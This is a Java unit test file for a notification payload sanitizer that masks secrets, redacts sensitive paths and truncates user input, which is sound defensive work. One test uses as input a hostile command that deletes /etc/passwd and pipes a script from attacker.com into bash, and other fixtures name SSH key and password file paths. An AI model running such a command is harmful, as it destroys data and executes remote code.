package com.kylinops.notification;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.kylinops.common.enums.RiskLevel;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * NotificationPayloadSanitizer 单元测试(纯规则,无 Spring)。
 */
class NotificationPayloadSanitizerTest {

    private final NotificationPayloadSanitizer sanitizer =
            new NotificationPayloadSanitizer(new ObjectMapper());

    @Test
    void secretKey_isReplaced() {
        // 规则:key 名包含 secret/token/password 等 → 值被 *** 替换
        // 模拟一个 nested map 的 auth.webhookSecret 字段
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        raw.put("webhookSecret", "s3cret-value");
        raw.put("apiToken", "tok-123");
        raw.put("ruleId", "rm_root_recursive");  // 普通 key 不替换
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        assertEquals("***", sanitized.get("webhookSecret"));
        assertEquals("***", sanitized.get("apiToken"));
        assertEquals("rm_root_recursive", sanitized.get("ruleId"));
    }

    @Test
    void userInputKey_inMap_isTruncatedTo50Chars() {
        // 模拟一个嵌套的 map 含 userInput
        String longInput = "rm -rf /etc/passwd && curl http://attacker.com/steal | bash # " + "x".repeat(100);
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        raw.put("userInput", longInput);
        raw.put("title", "L4");
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        String ui = (String) sanitized.get("userInput");
        assertTrue(ui.length() <= 53, "userInput 长度应截断: " + ui.length());
        assertTrue(ui.endsWith("..."), "userInput 应以 ... 结尾: " + ui);
    }

    @Test
    void sensitivePath_isRedacted() {
        // 把 DTO 序列化为 Map 之后,模拟一个 path 字段含敏感路径
        ObjectMapper m = new ObjectMapper();
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        raw.put("diskPath", "/etc/passwd backup");
        raw.put("sshKeyPath", "/root/.ssh/id_rsa");
        raw.put("dbPath", "/var/lib/mysql/data");
        raw.put("userHomeSsh", "/home/alice/.ssh/known_hosts");
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        assertEquals("/[REDACTED] backup", sanitized.get("diskPath"));
        // /root/.ssh/ / /var/lib/mysql/ / /home/.../.ssh/ / /etc/passwd|shadow 都含尾部 /,整个片段被 replace 为 /[REDACTED]
        assertEquals("/[REDACTED]id_rsa", sanitized.get("sshKeyPath"));
        assertEquals("/[REDACTED]data", sanitized.get("dbPath"));
        assertEquals("/[REDACTED]known_hosts", sanitized.get("userHomeSsh"));
    }

    @Test
    void nonSensitiveFields_passThrough() {
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        raw.put("title", "L4 blocked");
        raw.put("auditId", "audit-123");
        raw.put("count", 42);
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        assertEquals("L4 blocked", sanitized.get("title"));
        assertEquals("audit-123", sanitized.get("auditId"));
        assertEquals(42, sanitized.get("count"));
    }

    @Test
    void nestedMap_isRecursivelySanitized() {
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        java.util.Map<String, Object> nested = new java.util.HashMap<>();
        nested.put("password", "abc123");
        nested.put("username", "admin");
        raw.put("auth", nested);
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        @SuppressWarnings("unchecked")
        java.util.Map<String, Object> sanitizedNested = (java.util.Map<String, Object>) sanitized.get("auth");
        assertEquals("***", sanitizedNested.get("password"));
        assertEquals("admin", sanitizedNested.get("username"));
    }

    @Test
    void list_isRecursivelySanitized() {
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        java.util.Map<String, Object> item = new java.util.HashMap<>();
        item.put("apiKey", "k-123");
        raw.put("items", java.util.Arrays.asList(item));
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        @SuppressWarnings("unchecked")
        java.util.List<java.util.Map<String, Object>> items =
                (java.util.List<java.util.Map<String, Object>>) sanitized.get("items");
        assertEquals("***", items.get(0).get("apiKey"));
    }

    @Test
    void nullEvent_returnsEmptyJson() {
        String json = sanitizer.mask(null);
        assertNotNull(json);
        assertEquals("{}", json);
    }

    @Test
    void caseInsensitive_sensitiveKeyMatches() {
        java.util.Map<String, Object> raw = new java.util.HashMap<>();
        raw.put("API_KEY", "k1");
        raw.put("accessKey", "k2");
        raw.put("Private_Key", "k3");
        raw.put("PASSWORD", "p1");
        java.util.Map<String, Object> sanitized = sanitizer.sanitizeMap(raw);
        assertEquals("***", sanitized.get("API_KEY"));
        assertEquals("***", sanitized.get("accessKey"));
        assertEquals("***", sanitized.get("Private_Key"));
        assertEquals("***", sanitized.get("PASSWORD"));
    }

    @Test
    void result_isValidJson() {
        NotificationEvent e = NotificationEvent.builder()
                .eventType(NotificationEventType.L4_BLOCK)
                .severity(NotificationSeverity.CRITICAL)
                .title("t").summary("s").detail("d")
                .auditId("a").sessionId("s")
                .matchedRuleId("rule")
                .build();
        String json = sanitizer.mask(e);
        // 必须能被 Jackson 解析为 Map
        try {
            ObjectMapper m = new ObjectMapper();
            java.util.Map<?, ?> parsed = m.readValue(json, java.util.Map.class);
            assertNotNull(parsed);
            assertFalse(parsed.isEmpty());
        } catch (Exception ex) {
            throw new AssertionError("mask result not valid JSON: " + json, ex);
        }
    }
}
